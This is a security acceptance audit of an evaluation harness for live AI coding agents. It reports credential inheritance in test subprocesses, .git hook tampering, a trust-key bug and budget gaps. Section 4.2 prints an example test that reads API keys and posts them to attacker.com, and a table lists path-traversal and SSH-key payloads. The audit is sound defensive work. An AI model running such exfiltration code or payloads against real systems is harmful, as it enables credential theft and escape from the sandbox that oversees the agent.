# ForgeCore / Sarthi — Layer 4 Architecture & Security Acceptance Audit

**Audit Date:** 2026-11-06  
**Auditor:** Principal Software Architect, Security Auditor, Test Infrastructure Engineer  
**Repository Branch:** `main`  
**Commit SHA:** `fd2fe0602f3d5d5875ab87235074a994b48dd911`  
**Working-Tree State:** Clean (`nothing to commit, working tree clean`)  
**Scope:** Layer 4 Live AI Coding Agent Evaluation Framework (Phases 4.1 – 4.5)  

---

## Executive Summary & Acceptance Classification

### Final Acceptance Decision: **BLOCKED — SECURITY OR ARCHITECTURAL GAPS**

While the Layer 4 evaluation framework successfully demonstrates high modularity, elegant provider abstraction across 4 providers (Anthropic, Gemini, OpenAI, Mock), comprehensive reporting, and 100% offline unit/integration test coverage (139/139 passing tests), **it cannot be approved for live LLM API evaluation in its current state**.

The audit has identified **two critical security blockers** and **three high/medium architectural defects**:

1. **[CRITICAL BLOCKER - SEC-01] Verification Subprocess Credential Inheritance & Lack of OS-Level Sandbox:**
   When Sarthi executes `TestRunner` on AI-generated code (`subprocess.run(["pytest", "-q"], cwd=workspace_root)`), the process inherits the host process's full `os.environ` containing active provider secrets (`ANTHROPIC_API_KEY`, `GEMINI_API_KEY`, `OPENAI_API_KEY`). Because the test runner executes arbitrary agent-written Python code without an OS container or namespace isolation boundary, malicious or compromised agent code can trivially read and exfiltrate live host API keys.
2. **[HIGH BLOCKER - SEC-02] PathGuard Fails to Confine Workspace `.git/` Directory:**
   `PathGuard` verifies that target paths reside within `self.root`, but `.git` is not included in `DEFAULT_SECRET_PATTERNS`. An evaluated agent can call `write_file(".git/hooks/pre-commit", "...")` or overwrite `.git/config`, achieving arbitrary code execution when git commands are executed by Sarthi.
3. **[HIGH DEFECT - ARCH-01] Command Trust Approval Key Mismatch in Experiment Harness:**
   `ComparativeEvaluationHarness._preapprove_test_commands()` approves `{"tests": "pytest -q"}` (plural), whereas production `TestRunner.check_trust()` strictly verifies `{"test": cmd_str}` (singular). As a result, whenever an agent generates a test file, `TestRunner` treats the test execution as unapproved, skips test execution, and marks the report as `status="incomplete"`.
4. **[MEDIUM DEFECT - FIN-01] Post-Hoc Budget Accounting Without Pre-Dispatch Worst-Case Reservation:**
   `LiveEvalBudgetManager` checks and records costs *after* `provider.generate()` completes. When the remaining budget is less than the worst-case cost of `max_tokens_per_call` (4,096 tokens), the system still dispatches the request, leading to potential budget overruns.
5. **[MEDIUM DEFECT - EXP-01] Benchmark Fixture (`fastapi_app`) Lacks Existing Automated Test Suite:**
   The `fastapi_app` fixture contains only `main.py` and `pyproject.toml` without any `tests/` directory or pre-existing unit tests. As a result, `TestRunner` never runs against initial baseline code unless the agent happens to create a test suite from scratch.

---

## 1. Repository & Baseline Integrity Verification

Prior to auditing, the repository state and baseline test suite were verified:

```text
Commit SHA: fd2fe0602f3d5d5875ab87235074a994b48dd911
Branch: main
Working Tree: Clean
Ruff Linting: 0 errors (Passed)
Standards Linting: All schemas valid (Passed)
ECC Cryptographic Snapshot: 10/10 Invariants Verified (Passed)
Test Suite: 139 passed in 54.37s (100% Pass Rate)
```

No tests were skipped, mocked out, or disabled to obtain passing results.

---

## 2. Phase A — Architecture Conformance Audit

The architecture of `src/sarthi/eval/` was audited against its specification:

| Component | Responsibility | Audit Finding | Conformance |
| :--- | :--- | :--- | :--- |
| `config.py` | Configuration and credential validation | Decouples environment variables; implements validation methods for mock, anthropic, gemini, and openai. | **CONFORMS** |
| `budget.py` | Financial & token tracking | Implements model rate cards, token tracking, and hard limits. Post-hoc cost accounting identified (see FIN-01). | **PARTIAL** |
| `agent.py` | Sandboxed tool-calling agent loop | Gated by `PathGuard`; implements standard tools (`read_file`, `write_file`, `list_directory`, `complete_task`). | **CONFORMS** |
| `providers/base.py` | Abstract provider interface | Normalized `ChatMessage`, `ToolCall`, `ToolDefinition`, `ToolResult`, and `ProviderResponse` models. | **CONFORMS** |
| `providers/mock.py` | Deterministic offline test provider | Fully deterministic, zero-network adapter supporting canned and dynamic responses. | **CONFORMS** |
| `providers/anthropic.py` | Anthropic Claude Messages API adapter | Standard library HTTPS REST client; extracts system prompt, converts tools and messages cleanly. | **CONFORMS** |
| `providers/gemini.py` | Google Gemini REST API adapter | Maps function declarations, handles `functionCall` and `functionResponse`. | **CONFORMS** |
| `providers/openai.py` | OpenAI Chat Completions REST adapter | Maps tool definitions, function calls, and parses usage metadata. | **CONFORMS** |
| `scenarios.py` | Benchmark scenario definitions & staging | Connects to production `StackDetector`, `ConfigLoader`, and `ContextCompiler`. Fixture lacks initial tests (see EXP-01). | **PARTIAL** |
| `experiment.py` | A/B comparative experiment harness | Executes Baseline (Condition A) vs Sarthi (Condition B). Trust key bug identified (see ARCH-01). | **DEFECTIVE** |
| `reporter.py` | Scorecard & comparative reporting | Generates valid JSON and Markdown. Lacks Git SHA and statistical confidence markers (see REP-01). | **PARTIAL** |
| `runner.py` | Top-level execution orchestrator | Ephemeral workspace management, invokes harness and saves reports. | **CONFORMS** |
| `cli.py` (`sarthi eval`) | CLI command entry point | Exposes `--scenario`, `--provider`, `--model`, `--cost-cap`, `--output-dir`. | **CONFORMS** |

### Specific Architectural Checks

1. **Provider Isolation:** Provider-specific wire formats (e.g. Anthropic `tool_use`, Gemini `functionCall`, OpenAI `tool_calls`) are completely isolated inside their respective adapters in `src/sarthi/eval/providers/`. The agent loop (`agent.py`) and experiment harness (`experiment.py`) only interact with normalized `ProviderResponse` and `ToolCall` models.
2. **Provider Contract Consistency:** `MockProviderAdapter`, `AnthropicProviderAdapter`, `GeminiProviderAdapter`, and `OpenAIProviderAdapter` all inherit from `LLMProviderAdapter` and strictly implement `@property name -> str` and `generate()`.
3. **Normalized Provider Error Handling:** All provider network calls catch `urllib.error.HTTPError` and network exceptions, normalizing them into `RuntimeError`. The agent loop catches these exceptions, logs the error to `trajectory.error`, and terminates gracefully without crashing.
4. **Agent Iteration Limits:** `budget_manager.steps_count < config.max_agent_steps` is strictly enforced as a loop invariant. When exceeded, the loop terminates and sets `completed=False`.
5. **Separation of Completion Signal from Verification:** An agent calling `complete_task` only signals the end of its authoring turns (`trajectory.completed = True`). Whether the experiment succeeded is strictly determined by Sarthi's production `Verifier` (`verify_report.status == "passed"`).
6. **Production Component Wiring:** Sarthi guidance for Condition B is compiled directly using production `StackDetector(workspace_root).detect_stack()`, `ConfigLoader(workspace_root).load()`, and `ContextCompiler().compile_context()`.

---

## 3. Phase B — Budget and Financial Safety Audit

### Token & Cost Accounting Analysis

1. **Rate Card Correctness:** `MODEL_PRICING` reflects standard published rates for Claude 3.5 Sonnet (\$3.00/\$15.00), Claude 3.5 Haiku (\$0.80/\$4.00), Gemini 1.5 Pro (\$1.25/\$5.00), Gemini 1.5 Flash (\$0.075/\$0.30), GPT-4o (\$2.50/\$10.00), GPT-4o-mini (\$0.15/\$0.60), and Mock (\$0.00/\$0.00).
2. **Unknown Model Fallback:** Unregistered models fall back to Claude 3.5 Sonnet pricing `(3.00, 15.00)` as a safe conservative default.
3. **Missing Metadata Behavior:** In `anthropic.py`, `gemini.py`, and `openai.py`, if an API response omits usage metadata, token counts default to `0`. Consequently, `call_cost` is calculated as `$0.00`.
   - *Risk:* If a provider experiences an API degradation and drops usage metadata, token consumption will not be charged against the budget.
4. **Post-Hoc Accounting Defect (FIN-01):**
   - *Code:* In `agent.py`:
     ```python
     budget_manager.record_step(config)
     resp = provider.generate(...)
     budget_manager.record_usage(..., config=config)
     ```
   - *Vulnerability:* The budget is only checked *after* the provider call returns. If the current cost is \$0.49 and `cost_cap_usd` is \$0.50, a call requesting 4,096 completion tokens can cost up to \$0.0614, pushing the total cost to \$0.5514.
   - *Requirement:* A pre-dispatch budget reservation must be implemented:
     $$\text{remaining\_budget} \ge \text{worst\_case\_call\_cost}$$

---

## 4. Phase C — Adversarial Sandbox Security Audit

### 4.1 Path & Filesystem Attack Testing

Testing was performed against `PathGuard` and `SandboxedAgentLoop`:

| Attack Vector | Payload / Action | Result | Security Status |
| :--- | :--- | :--- | :--- |
| **Directory Traversal** | `read_file("../../etc/passwd")` | Rejected: `PathTraversalError` | **PASS** |
| **Absolute Path Escape** | `read_file("C:/Windows/System32")` | Rejected: `PathTraversalError` | **PASS** |
| **Windows Drive Traversal** | `read_file("D:/private/data")` | Rejected: `PathTraversalError` | **PASS** |
| **UNC Network Share** | `read_file("//remote-server/share")` | Rejected: `PathTraversalError` | **PASS** |
| **Mixed Slash Traversal** | `read_file("..\\..\\config.yaml")` | Resolved & Rejected: `PathTraversalError` | **PASS** |
| **Secret File Access** | `read_file(".env")` | Rejected: `SecretFileAccessError` | **PASS** |
| **SSH Key Exfiltration** | `read_file("~/.ssh/id_rsa")` | Rejected: `PathTraversalError` | **PASS** |
| **Outside Directory Write** | `write_file("../malicious.py", "...")` | Rejected: `PathTraversalError` | **PASS** |
| **Git Directory Tampering** | `write_file(".git/hooks/pre-commit", "...")` | **Permitted: File created!** | **FAIL (SEC-02)** |

### 4.2 Subprocess Isolation & Credential Leakage (CRITICAL BLOCKER SEC-01)

#### The Architectural Reality
`PathGuard` is an **application-level filesystem authorization check** implemented in Python. It governs the four agent tool calls (`read_file`, `write_file`, `list_directory`, `complete_task`).

However, Sarthi does not merely inspect files—it verifies them by executing deterministic tools, including `TestRunner` which executes `pytest`.

#### Reproduction Evidence
In `src/sarthi/core/verify/runners/tests.py`:
```python
res = subprocess.run(
    cmd,
    cwd=str(ctx.project_root),
    capture_output=True,
    text=True,
    timeout=60,
    shell=False,
)
```
Notice:
1. `env` parameter is not passed to `subprocess.run()`. Under Python standard library rules, `env=None` causes the child process to **inherit the full environment of the parent process** (`os.environ`).
2. When live evaluation is enabled, the parent process contains:
   - `ANTHROPIC_API_KEY`
   - `GEMINI_API_KEY`
   - `OPENAI_API_KEY`
3. The code executed by `pytest` is **code written by the AI agent** in `tests/`.
4. If an evaluated agent (either spontaneously or via prompt injection) generates a test:
   ```python
   # tests/test_exploit.py
   import os, urllib.request

   def test_exfiltrate():
       keys = {k: v for k, v in os.environ.items() if "API_KEY" in k}
       urllib.request.urlopen("https://attacker.com", data=str(keys).encode())
   ```
   When `Verifier` executes `TestRunner`, **the AI-generated exploit executes on the host OS**, reads the provider API keys, and has unconstrained outbound network access.
5. Furthermore, the subprocess has the full privileges of the host user running Sarthi, allowing reading/writing host files outside the temporary directory.

**Conclusion:** Without OS-level isolation (e.g. Docker container, Linux namespace jail, or Windows AppContainer) and without environment scrubbing (`env={...}`), live evaluation represents an active arbitrary code execution and credential exfiltration vector.

---

## 5. Phase D — Provider Contract and Tool-Calling Audit

All four provider implementations were tested using mock requests and schema inspections:

1. **Normalized Request / Response:**
   Every adapter converts internal `ChatMessage` into provider-specific JSON and converts provider responses into a unified `ProviderResponse(content, tool_calls, prompt_tokens, completion_tokens, raw_response)`.
2. **Anthropic Claude Adapter:**
   - Correctly places system prompt into top-level `"system"` parameter.
   - Formats `tool_use` and `tool_result` content blocks according to Anthropic's Messages API specification.
   - Accurately parses input/output token usage.
3. **Google Gemini Adapter:**
   - Correctly separates system instruction into `"systemInstruction"`.
   - Translates tool definitions into `functionDeclarations`.
   - Handles `functionCall` and `functionResponse` roles.
4. **OpenAI Adapter:**
   - Translates tool definitions into `{"type": "function", "function": {...}}`.
   - Parses arguments safely with `json.loads(fn.get("arguments", "{}"))`.
   - Handles multi-tool responses cleanly.
5. **Network Timeout Guard:**
   All HTTP requests use `urllib.request.urlopen(..., timeout=120)`. While this prevents hanging indefinitely, the timeout is hardcoded to 120s rather than inheriting `config.timeout_seconds`.

---

## 6. Phase E & F — A/B Fairness & Verification Integrity Audit

### 6.1 Experimental Fairness Assessment

| Attribute | Baseline (Condition A) | Sarthi (Condition B) | Parity Evaluation |
| :--- | :--- | :--- | :--- |
| **Initial Repository State** | Clean copy of fixture with git repo | Clean copy of fixture with git repo | **100% Identical** |
| **Developer Task Prompt** | `scenario.task_prompt` | `scenario.task_prompt` | **100% Identical** |
| **Provider & Model** | Same instance from `config` | Same instance from `config` | **100% Identical** |
| **Tool Availability** | `read_file`, `write_file`, `list_dir`, `complete` | `read_file`, `write_file`, `list_dir`, `complete` | **100% Identical** |
| **Resource Caps** | `max_steps`, `cost_cap`, `timeout` | `max_steps`, `cost_cap`, `timeout` | **100% Identical** |
| **Verification Scope** | `Verifier(scope="all", timeout=45)` | `Verifier(scope="all", timeout=45)` | **100% Identical** |
| **Prompt Difference** | Generic software engineer system prompt | Sarthi Core Contract + Standards + Skills | **Intentional Independent Variable** |

### 6.2 Command Trust Approval Key Mismatch (HIGH DEFECT ARCH-01)

#### Reproduction Steps
In `src/sarthi/eval/experiment.py`:
```python
def _preapprove_test_commands(self, workspace_root: Path, trust_mgr: CommandTrustManager) -> None:
    config_loader = ConfigLoader(workspace_root)
    cfg = config_loader.load()
    if cfg.verify and cfg.verify.commands:
        trust_mgr.approve(workspace_root, cfg.verify.commands)
    else:
        # Default test command for python/pytest
        trust_mgr.approve(workspace_root, {"tests": "pytest -q"})  # <--- DEFECT: Key is "tests"
```
In `src/sarthi/core/verify/runners/tests.py`:
```python
cmd_str = " ".join(default_cmd)
if not self.trust_mgr.is_approved(ctx.project_root, {"test": cmd_str}):  # <--- Key expected is "test"
    return False, f"Project test execution ('{cmd_str}') is unapproved..."
```

#### Impact
When an agent creates test files in the workspace:
1. `TestRunner._detect_default_command()` resolves `["pytest", "-q"]`.
2. `TestRunner.check_trust()` checks whether `{"test": "pytest -q"}` is approved in the trust store.
3. Because `experiment.py` recorded approval under the key `"tests"`, the cryptographic hash does not match!
4. `TestRunner` refuses to execute, reports unapproved command, and marks `verify_report.status = "incomplete"`.
5. The evaluation outcome is distorted: any agent that writes automated tests is marked as incomplete rather than passed!

---

## 7. Phase G — Reproducibility & Reporting Audit

### 7.1 Report Structure Analysis
`EvaluationReporter` outputs both machine-readable JSON and human-readable Markdown.
The reports capture:
- Per-scenario baseline vs Sarthi verification status.
- Number of verification findings and net findings delta.
- Prompt tokens, completion tokens, total tokens, and financial cost.
- Execution steps count.

### 7.2 Deficiencies Identified (REP-01)
1. **Missing Git & Provenance Metadata:** The JSON report does not record the Sarthi commit SHA, ECC snapshot version/hash, or timestamp of baseline vs Sarthi runs.
2. **Lack of Sample Size & Uncertainty Disclaimer:** Evaluations currently run as $n=1$ paired comparisons. The report does not include standard error, sample size notes, or a disclaimer warning against drawing statistical conclusions from a single trial.

---

## 8. Phase H — GitHub Actions Security Audit

Inspection of `.github/workflows/live-eval.yml`:

| Requirement | Implementation State | Finding |
| :--- | :--- | :--- |
| **Manual Trigger Only** | `on: workflow_dispatch` | Confirmed. No PR or push triggers. |
| **Fork PR Access** | Not triggered by PRs | Confirmed. External PRs cannot execute this workflow. |
| **Timeout Boundary** | `timeout-minutes: 15` | Confirmed. Bounded execution. |
| **Permissions** | Not explicitly specified | Should be pinned to `permissions: contents: read`. |
| **Secret Injection Boundary** | Line 62–64 injects all 3 keys into the job | All 3 keys are exposed to the runner environment simultaneously. |
| **Subprocess Secret Leakage** | Inherited by `subprocess.run` in `pytest` | **HIGH RISK:** Generates artifact reports containing output from tests that could echo environment variables. |

---

## 9. Comprehensive Vulnerability & Defect Inventory

| ID | Severity | Component | Summary | Blocks Live Eval? |
| :--- | :--- | :--- | :--- | :--- |
| **SEC-01** | **CRITICAL** | `verify/runners/tests.py` | Verification subprocess inherits host `os.environ` containing LLM API keys without OS-level sandboxing | **YES** |
| **SEC-02** | **HIGH** | `core/pathguard.py`, `eval/agent.py` | PathGuard permits read/write access to `.git/` directory and `.git/hooks/` inside workspace | **YES** |
| **ARCH-01** | **HIGH** | `eval/experiment.py` | Pre-approval key mismatch (`"tests"` vs `"test"`) causes all agent-written tests to fail approval | **YES** |
| **FIN-01** | **MEDIUM** | `eval/budget.py`, `eval/agent.py` | Missing pre-dispatch budget reservation allows requests exceeding remaining budget | **NO** |
| **EXP-01** | **MEDIUM** | `eval/scenarios.py` | `fastapi_app` fixture contains no pre-existing automated tests | **NO** |
| **REP-01** | **LOW** | `eval/reporter.py` | Reports omit Sarthi commit SHA and statistical confidence/uncertainty disclaimers | **NO** |
| **NET-01** | **LOW** | `eval/providers/*.py` | Network `urlopen` timeout is hardcoded to 120s rather than using `config.timeout_seconds` | **NO** |

---

## 10. Concrete Remediation Plan

To transition Layer 4 from **BLOCKED** to **ACCEPTED**, execute the following remediation steps:

### Remediation Step 1: Environment Scrubbing for Test Subprocesses (Fixes SEC-01)
In `src/sarthi/core/verify/runners/tests.py`:
Explicitly sanitize the subprocess environment. Never pass `os.environ` directly:
```python
# Strip all API keys, tokens, and sensitive host variables
safe_env = {
    "PATH": os.environ.get("PATH", ""),
    "SYSTEMROOT": os.environ.get("SYSTEMROOT", ""),
    "TEMP": os.environ.get("TEMP", ""),
    "TMP": os.environ.get("TMP", ""),
    "PYTHONPATH": str(ctx.project_root),
}
res = subprocess.run(cmd, cwd=str(ctx.project_root), env=safe_env, capture_output=True, text=True, timeout=60)
```

### Remediation Step 2: Block `.git` in PathGuard & Agent Tooling (Fixes SEC-02)
Add `.git` and `.git/*` to `DEFAULT_SECRET_PATTERNS` or add an explicit check in `PathGuard.safe_path`:
```python
if any(part == ".git" for part in p.parts):
    raise PathGuardError(f"Access to internal VCS metadata directory '.git' is strictly forbidden")
```

### Remediation Step 3: Correct Command Trust Key in Experiment Harness (Fixes ARCH-01)
In `src/sarthi/eval/experiment.py` (`_preapprove_test_commands`):
Change `{"tests": "pytest -q"}` to `{"test": "pytest -q"}` to match `TestRunner.check_trust`.

### Remediation Step 4: Implement Pre-Dispatch Budget Check (Fixes FIN-01)
In `src/sarthi/eval/budget.py`:
Add `can_dispatch_call(model, max_tokens, config) -> tuple[bool, str | None]` and call it before `provider.generate()`.

### Remediation Step 5: Add Baseline Unit Tests to Benchmark Fixture (Fixes EXP-01)
Add `tests/test_main.py` in `tests/fixtures/fastapi_app/` with baseline health-check and items endpoint tests so `TestRunner` has an active test suite to verify from turn 0.

### Remediation Step 6: Enrich Evaluation Metadata (Fixes REP-01)
Include `sarthi_commit_sha`, `run_timestamp`, and statistical sample size note in `EvaluationReporter`.

---

## 11. Final Audit Verdict

The Layer 4 implementation is **structurally well-engineered and 100% functionally tested offline**, but is **BLOCKED for live evaluation** due to subprocess credential inheritance (`SEC-01`), `.git` access vulnerability (`SEC-02`), and command trust key mismatch (`ARCH-01`).

Once these remediations are applied and verified, Layer 4 can safely transition to **COMPLETE — LAYER 4 ACCEPTED**.
